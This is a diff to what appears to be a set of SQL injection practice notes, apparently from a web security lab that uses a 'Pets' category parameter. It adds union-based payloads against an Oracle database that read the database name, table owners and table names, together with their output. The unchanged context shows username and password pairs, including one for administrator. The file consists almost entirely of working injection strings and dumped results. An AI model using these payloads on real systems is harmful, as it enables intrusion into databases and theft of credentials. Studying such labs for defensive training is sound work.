@@ -7,6 +7,22 @@ Pets'+or+'1'%3d'1'--
 Pets'+or+'1'%3d'1'+order+by+2--
 Pets'+union+select+null,null+from+dual--
 Pets'+union+select+banner,null+from+v$version--
+
+Pets'+union+select+sys.database_name,null+from+dual--
+
+XE
+
+Pets'+union+select+distinct+owner,null+from+all_tables--
+
+APEX_040000
+CTXSYS
+MDSYS
+PETER
+SYS
+SYSTEM
+XDB
+
+Pets'+union+select+table_name,null+from+all_tables--
 ```
 ### mysql
 ```
@@ -110,3 +126,4 @@ carlos:01znvxvuiqopwydfln92
 wiener:mdcn7w1my9mdpnoc0l6m
 administrator:7qpk90futuka5actprm7
 ```
+
